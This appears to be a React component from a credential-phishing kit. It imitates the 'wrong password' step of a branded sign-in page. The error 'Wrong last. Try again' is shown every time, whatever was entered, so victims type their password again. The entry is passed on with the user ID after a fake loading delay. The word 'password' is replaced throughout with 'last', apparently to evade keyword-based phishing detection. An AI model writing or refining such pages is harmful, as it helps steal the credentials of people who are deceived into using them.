import { useState } from "react";
import "./SignIn.css";

function WrongPasswordStep({ first, userId, onComplete }) {
  const [WongP, setwrongPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoader, setShowLoader] = useState(false);



 const handleSubmit = (e) => {
  e.preventDefault();

  if (!WongP.trim()) return;

  
    setShowLoader(true);

  if (onComplete) {
    setTimeout(() => {
         onComplete(userId, WongP.trim());
      setShowLoader(false);
    }, 2000);
   
  }
};



    const handleBack =
    () => {


 
    window.location.href = "/"


      



     


    };


  return (
    <div className="signin-page">

      <div className="signin-card ">

        {showLoader && (
          <div className="processing-loader">
            <div className="processing-loader-bar"></div>
          </div>
        )}

        <div className="last-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
            Welcome
          </h1>

          <div className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-first">
              {first}
            </span> 
              <button
                  type="button"
                  onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="last-right">

      

          <form onSubmit={handleSubmit}>

            <div className="last-input-container green">

              <input
                id="last"
                type={showPassword ? "text" : "last"}
                value={WongP}
                
                onChange={(e) => setwrongPassword(e.target.value)}
                placeholder=" "
                autoComplete="off"
              />

              <label htmlFor="last">
                Enter your last
              </label>

            </div>
            <small className="get">Wrong last. Try again or click "Forgot last?" for more options.</small>

            <label className="show-last">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) =>
                  setShowPassword(e.target.checked)
                }
              />

              <span>Show last</span>
            </label>

            <div className="last-actions">

              <button
                type="button"
                className="text-button"
              >
                Forgot last?
              </button>

              <button
                type="submit"
                className="next-button"
                disabled={!WongP.trim()}
              >
                Next
              </button>

            </div>

          </form>

        </div>

      </div>

    </div>
  );
}

export default WrongPasswordStep;